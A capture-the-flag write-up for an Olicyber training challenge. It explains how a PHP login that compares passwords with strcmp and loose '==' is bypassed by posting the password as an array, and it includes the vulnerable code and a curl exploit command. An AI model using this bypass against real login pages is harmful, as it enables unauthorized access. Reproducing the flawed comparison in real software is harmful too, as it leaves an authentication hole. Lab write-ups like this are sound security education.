# URL
https://training.olicyber.it/challenges#challenge-57
# Concept
* PHP type juggling
* PHP strcmp function
# Method of solve
* the app uses this code for the login function:
```
<?php
      if (isset($_POST['password'])) {
        if (strcmp($_POST['password'], $password) == 0) {
          echo $FLAG;
        } else {
          echo '<br />Wrong Password<br /><br />';
        }
      }
?>
```
* the code uses loose comparison `==` in it `strcmp` function, which is vulnerable to the type juggling vulnerability
* in particular, we can use `strcmp` function with type juggling to compare a string against an array, which results in `NULL`
* `NULL` in PHP is akin to `0`, which is the True condition for the `strcmp` function
* we can send an array as the password in this case to return the `strcmp` function true, and login
```
curl -v -X POST -d 'password[]=test' http://clogin.challs.olicyber.it/
```

